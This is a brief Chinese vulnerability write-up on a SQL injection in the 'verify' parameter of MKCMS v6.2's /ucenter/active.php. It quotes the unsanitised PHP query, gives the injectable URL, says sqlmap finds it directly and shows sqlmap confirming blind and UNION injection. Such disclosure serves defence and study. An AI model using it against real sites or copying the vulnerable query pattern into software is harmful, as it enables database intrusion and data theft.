MKCMS v6.2 /ucenter/active.php前台sql注入漏洞
=============================================

一、漏洞简介
------------

二、漏洞影响
------------

MKCMS v6.2

三、复现过程
------------

`/ucenter/active.php?verify=1`存在注入

    /ucenter/active.php
    <?php
    ...
    $verify = stripslashes(trim($_GET['verify']));  //去掉了转义用的    $nowtime = time();
    $query = mysql_query("select u_id from mkcms_user where u_question='$verify'");
    $row = mysql_fetch_array($query);
    ...

sqlmap直接跑即可

    [INFO] GET parameter 'verify' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
    [INFO] GET parameter 'verify' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

参考链接
--------

> https://xz.aliyun.com/t/7580\#toc-4
